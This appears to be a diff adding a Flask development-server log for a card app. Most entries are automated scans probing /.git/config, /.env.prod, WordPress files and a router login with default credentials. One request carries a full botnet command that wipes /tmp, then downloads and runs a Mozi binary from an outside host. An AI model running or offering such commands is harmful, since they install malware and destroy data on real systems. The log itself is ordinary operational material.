@@ -1,0 +1,77 @@
+c:\CardApp\app.py:17: FutureWarning: 
+
+All support for the `google.generativeai` package has ended. It will no longer be receiving 
+updates or bug fixes. Please switch to the `google.genai` package as soon as possible.
+See README for more details:
+
+https://github.com/google-gemini/deprecated-generative-ai-python/blob/main/README.md
+
+  import google.generativeai as genai
+ * Serving Flask app 'app'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:7185
+ * Running on http://172.16.0.4:7185
+Press CTRL+C to quit
+127.0.0.1 - - [12/Feb/2026 03:49:21] "GET /mcp HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 03:49:21] "GET /api/mcp HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 03:49:21] "GET /v1/mcp HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 03:49:21] "GET /jsonrpc HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 03:49:21] "GET /mcp HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 03:49:21] "GET /api/mcp HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 03:49:21] "GET /v1/mcp HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 03:49:22] "GET /jsonrpc HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 03:49:22] "GET /mcp HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 03:49:22] "GET /api/mcp HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 03:49:22] "GET /v1/mcp HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 03:49:22] "GET /jsonrpc HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 03:51:43] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 03:57:20] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Feb/2026 04:00:02] "GET / HTTP/1.0" 302 -
+127.0.0.1 - - [12/Feb/2026 04:05:13] "GET / HTTP/1.0" 302 -
+127.0.0.1 - - [12/Feb/2026 04:10:56] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 -
+127.0.0.1 - - [12/Feb/2026 04:29:27] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Feb/2026 04:46:34] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:06:59] "GET / HTTP/1.1" 302 -
+c:\CardApp\app.py:77: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  return {"now": datetime.utcnow()}
+127.0.0.1 - - [12/Feb/2026 05:06:59] "GET /login?next=/ HTTP/1.1" 200 -
+127.0.0.1 - - [12/Feb/2026 05:16:59] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Feb/2026 05:21:31] "GET /.git/config HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:22:34] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Feb/2026 05:22:34] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Feb/2026 05:22:35] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:22:35] "GET /xmlrpc.php?rsd HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:22:35] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Feb/2026 05:22:35] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:22:35] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:22:36] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:22:36] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:22:36] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:22:36] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:22:36] "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:22:36] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:22:36] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:22:37] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:22:37] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:22:37] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:22:37] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:22:37] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:22:37] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:23:45] "GET /.git/config HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:27:12] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Feb/2026 05:34:59] "GET /.git/config HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:47:59] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:51:28] "GET /actuator/health HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 05:52:13] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Feb/2026 05:56:41] "GET /.env.prod HTTP/1.0" 404 -
+127.0.0.1 - - [12/Feb/2026 06:02:15] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Feb/2026 06:09:29] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Feb/2026 06:19:07] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Feb/2026 06:19:09] "GET /login?next=/ HTTP/1.1" 200 -
+127.0.0.1 - - [12/Feb/2026 06:19:11] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 06:38:14] "GET /backup/ HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 06:44:27] "GET /.git/refs/ HTTP/1.1" 404 -
+127.0.0.1 - - [12/Feb/2026 06:47:20] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Feb/2026 06:47:21] "GET / HTTP/1.1" 302 -
